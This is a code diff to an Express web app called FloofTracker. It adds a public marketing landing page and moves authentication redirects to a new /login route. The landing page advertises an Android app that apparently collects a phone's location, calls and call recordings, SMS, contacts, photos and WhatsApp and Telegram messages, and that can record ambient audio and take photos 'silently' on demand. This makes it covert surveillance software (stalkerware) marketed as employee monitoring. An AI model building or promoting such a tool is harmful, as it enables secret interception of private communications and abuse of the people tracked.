@@ -324,7 +324,7 @@ function requireAuth(req, res, next) {
 }
 
 function requireAuthPage(req, res, next) {
-    if (!req.session || !req.session.employer_id) return res.redirect('/');
+    if (!req.session || !req.session.employer_id) return res.redirect('/login');
     next();
 }
 
@@ -871,8 +871,104 @@ app.post('/device/call-recording', bigJson, deviceLimiter, requireValidDeviceTok
 
 // ── Frontend Pages ───────────────────────────────────────────────────────────
 
+// Public landing page: anyone can browse the features before signing in.
+// "Dashboard" sends logged-in users straight to /tokens, everyone else to
+// /login first.
 app.get('/', (req, res) => {
-    res.send(`<!DOCTYPE html><html><head><title>FloofTracker</title><style>
+    const loggedIn = !!(req.session && req.session.employer_id);
+    const dashboardHref = loggedIn ? '/tokens' : '/login';
+    res.send(`<!DOCTYPE html><html><head><title>FloofTracker - Employee Monitoring</title><style>
+    ${styles}
+    .hero { text-align:center; padding:64px 20px 40px; }
+    .hero h2 { font-size:40px; color:#1a1a2e; letter-spacing:-.02em; margin-bottom:16px; line-height:1.15; }
+    .hero p { color:#6b7280; font-size:17px; max-width:660px; margin:0 auto 32px; line-height:1.6; }
+    .hero-btns { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
+    .btn-lg { padding:14px 32px; font-size:15px; }
+    .feature-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px,1fr)); gap:16px; margin-top:8px; }
+    .feature-item { background:#f8f9fc; border:1px solid #eceef3; border-radius:12px; padding:22px 18px; text-align:center; transition: transform .18s ease, box-shadow .18s ease; }
+    .feature-item:hover { transform: translateY(-2px); box-shadow: 0 8px 18px rgba(16,24,40,.07); }
+    .feature-item .icon { font-size:32px; margin-bottom:10px; }
+    .feature-item h4 { color:#1a1a2e; margin-bottom:6px; }
+    .feature-item p { color:#6b7280; font-size:13px; line-height:1.5; }
+    .steps { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px,1fr)); gap:16px; margin-top:8px; }
+    .step { background:#fff; border:1px solid #e8eaf0; border-radius:12px; padding:22px 18px; text-align:center; }
+    .step .num { width:34px; height:34px; border-radius:50%; background:#1a1a2e; color:#fff; font-weight:700; font-size:15px; display:flex; align-items:center; justify-content:center; margin:0 auto 12px; }
+    .step h4 { color:#1a1a2e; margin-bottom:6px; }
+    .step p { color:#6b7280; font-size:13px; line-height:1.5; }
+    .section-head { text-align:center; margin-bottom:24px; }
+    .section-head h3 { color:#1a1a2e; font-size:24px; margin-bottom:8px; }
+    .section-head p { color:#6b7280; font-size:14.5px; }
+    .cta-band { text-align:center; padding:10px 20px 40px; }
+    .footer { text-align:center; color:#9ca3af; font-size:12.5px; padding:26px 20px; border-top:1px solid #e8eaf0; }
+    </style></head><body>
+    <div class="header">
+        <h1>🐾 FloofTracker</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap">
+            <button class="btn btn-primary" onclick="goDashboard()">Dashboard</button>
+            ${loggedIn
+                ? '<button class="btn btn-danger" onclick="window.location.href=\'/logout\'">Logout</button>'
+                : '<button class="btn btn-outline" onclick="window.location.href=\'/login\'">Login</button><button class="btn btn-success" onclick="window.location.href=\'/register\'">Sign Up Free</button>'}
+        </div>
+    </div>
+    <div class="container">
+        <div class="hero">
+            <h2>Know what's happening on your company devices</h2>
+            <p>FloofTracker gives you real-time visibility into location, calls, messages, app usage, media and more — all from a single dashboard.</p>
+            <div class="hero-btns">
+                <button class="btn btn-primary btn-lg" onclick="goDashboard()">Go to Dashboard</button>
+                <button class="btn btn-outline btn-lg" onclick="window.location.href='/register'">Create Free Account</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="section-head">
+                <h3>Everything you need to monitor</h3>
+                <p>One lightweight Android app. One dashboard. All the data.</p>
+            </div>
+            <div class="feature-grid">
+                <div class="feature-item"><div class="icon">📍</div><h4>GPS Location</h4><p>Real-time location tracking with accuracy and history</p></div>
+                <div class="feature-item"><div class="icon">📞</div><h4>Call Logs & Recordings</h4><p>Incoming, outgoing and missed calls with duration and audio</p></div>
+                <div class="feature-item"><div class="icon">💬</div><h4>SMS Messages</h4><p>All sent and received text messages</p></div>
+                <div class="feature-item"><div class="icon">📊</div><h4>App Usage</h4><p>Which apps are used and for how long</p></div>
+                <div class="feature-item"><div class="icon">👥</div><h4>Contacts</h4><p>Full contact list with names and numbers</p></div>
+                <div class="feature-item"><div class="icon">🖼️</div><h4>Photos & Screenshots</h4><p>Thumbnail previews, with full-resolution downloads</p></div>
+                <div class="feature-item"><div class="icon">💌</div><h4>Instant Messages</h4><p>Messenger, WhatsApp, Telegram and more</p></div>
+                <div class="feature-item"><div class="icon">🎙️</div><h4>Remote Recording</h4><p>Capture ambient audio on demand, right from the dashboard</p></div>
+                <div class="feature-item"><div class="icon">📷</div><h4>Remote Photo</h4><p>Silently capture front or back camera</p></div>
+                <div class="feature-item"><div class="icon">⚡</div><h4>Live Status</h4><p>See online/offline status and last-seen at a glance</p></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="section-head">
+                <h3>How it works</h3>
+                <p>Up and running in minutes</p>
+            </div>
+            <div class="steps">
+                <div class="step"><div class="num">1</div><h4>Create your account</h4><p>Sign up free — no credit card required</p></div>
+                <div class="step"><div class="num">2</div><h4>Add a device</h4><p>Generate a token and install the FloofTracker app on the phone</p></div>
+                <div class="step"><div class="num">3</div><h4>Open the dashboard</h4><p>View location, calls, messages, media and more in real time</p></div>
+            </div>
+        </div>
+
+        <div class="cta-band">
+            <h3 style="color:#1a1a2e;font-size:22px;margin-bottom:10px">Ready to get started?</h3>
+            <p style="color:#6b7280;margin-bottom:20px;font-size:14.5px">Join employers who monitor their teams with FloofTracker.</p>
+            <div class="hero-btns">
+                <button class="btn btn-primary btn-lg" onclick="goDashboard()">Go to Dashboard</button>
+                <button class="btn btn-success btn-lg" onclick="window.location.href='/register'">Sign Up Free</button>
+            </div>
+        </div>
+    </div>
+    <div class="footer">© 2026 FloofTracker · Employee monitoring made simple</div>
+    <script>
+        function goDashboard() { window.location.href = '${dashboardHref}'; }
+    </script>
+    </body></html>`);
+});
+
+app.get('/login', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Login - FloofTracker</title><style>
     ${styles}
     .login-wrap { display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
     .login-box { background:white; border:1px solid #e8eaf0; border-radius:16px; padding:40px; width:380px; box-shadow:0 8px 30px rgba(16,24,40,.08); }
@@ -891,6 +987,7 @@ app.get('/', (req, res) => {
             <input type="password" id="password" placeholder="Password"/>
             <button class="btn btn-primary" onclick="login()">Login</button>
             <a href="/register">Don't have an account? Register here</a>
+            <a href="/">← Back to home</a>
         </div>
     </div>
     <script>
@@ -936,7 +1033,7 @@ app.get('/register', (req, res) => {
             <input type="password" id="password" placeholder="Password"/>
             <input type="password" id="confirm" placeholder="Confirm password"/>
             <button class="btn btn-primary" onclick="register()">Create Account</button>
-            <a href="/">Already have an account? Login</a>
+            <a href="/login">Already have an account? Login</a>
         </div>
     </div>
     <script>
@@ -991,7 +1088,7 @@ app.get('/welcome', requireAuthPage, (req, res) => {
         </div>
     </div>
     <script>
-        if (!localStorage.getItem('employer_id')) window.location.href = '/';
+        if (!localStorage.getItem('employer_id')) window.location.href = '/login';
         function logout() { window.location.href = '/logout'; }
     </script>
     </body></html>`);
@@ -1042,7 +1139,7 @@ app.get('/plans', requireAuthPage, (req, res) => {
         </div>
     </div>
     <script>
-        if (!localStorage.getItem('employer_id')) window.location.href = '/';
+        if (!localStorage.getItem('employer_id')) window.location.href = '/login';
         window.CSRF_TOKEN = '${res.locals.csrfToken}';
         function logout() { window.location.href = '/logout'; }
         async function selectPlan(plan) {
@@ -1082,7 +1179,7 @@ app.get('/tokens', requireAuthPage, (req, res) => {
         </div>
     </div>
     <script>
-        if (!localStorage.getItem('employer_id')) window.location.href = '/';
+        if (!localStorage.getItem('employer_id')) window.location.href = '/login';
         window.CSRF_TOKEN = '${res.locals.csrfToken}';
         const plan = localStorage.getItem('plan') || 'free';
         const limits = { free:1, starter:5, business:10, professional:20, enterprise:'Unlimited' };
@@ -1418,7 +1515,7 @@ app.get('/device', requireAuthPage, async (req, res) => {
     </div>
 
     <script>
-    if (!localStorage.getItem('employer_id')) window.location.href = '/';
+    if (!localStorage.getItem('employer_id')) window.location.href = '/login';
     window.CSRF_TOKEN = '${res.locals.csrfToken}';
 </script>
 <script src="/dashboard.js"></script>
